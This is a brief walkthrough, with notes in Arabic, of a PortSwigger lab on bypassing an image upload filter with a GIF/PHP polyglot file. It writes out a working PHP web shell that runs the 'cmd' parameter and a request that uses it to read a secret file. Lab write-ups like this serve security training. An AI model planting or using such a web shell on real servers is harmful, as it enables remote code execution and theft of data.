# Lab : Remote code execution via polyglot web shell upload

https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload

- الفكره من الLab ده ان الfunction الي بترفع الصور عملت حظر علي content الي في الملف ان هو مش صوره فا هنستخدم polyglot الي هوا عباره عن تحويل ملف وهو يتصرف كاملف تاني ذي ده الموقع قرا الملف صوره بس هو اتنفو كا ملف php

```bash
1. nano test.php

2. GIF89a<?php system($_GET["cmd"]); __halt_compiler();?>'

3. /files/avatars/shell.php?cmd= cat /home/carlos/secret
```
